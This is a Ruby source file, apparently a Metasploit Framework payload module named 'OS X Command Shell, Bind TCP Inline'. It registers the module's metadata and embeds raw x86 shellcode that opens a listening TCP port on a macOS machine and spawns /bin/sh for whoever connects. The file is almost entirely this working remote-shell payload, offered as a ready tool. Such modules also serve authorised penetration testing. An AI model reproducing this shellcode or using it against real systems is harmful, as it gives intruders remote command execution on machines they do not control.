##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Osx
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'OS X Command Shell, Bind TCP Inline',
      'Description' => 'Listen for a connection and spawn a command shell',
      'Author'      => 'Ramon de C Valle',
      'License'     => MSF_LICENSE,
      'Platform'    => 'osx',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::BindTcp,
      'Session'     => Msf::Sessions::CommandShellUnix,
      'Payload'     =>
        {
          'Offsets' =>
            {
              'LPORT' => [6, 'n'],
            },
          'Payload' =>
            "\x31\xc0\x50\x68\xff\x02\x11\x5c\x89\xe7\x50\x6a\x01\x6a\x02\x6a\x10\xb0\x61\xcd\x80\x57\x50" +
            "\x50\x6a\x68\x58\xcd\x80\x89\x47\xec\xb0\x6a\xcd\x80\xb0\x1e\xcd\x80\x50\x50\x6a\x5a\x58\xcd" +
            "\x80\xff\x4f\xe4\x79\xf6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x54\x53" +
            "\x50\xb0\x3b\xcd\x80"
        }
      ))
  end
end
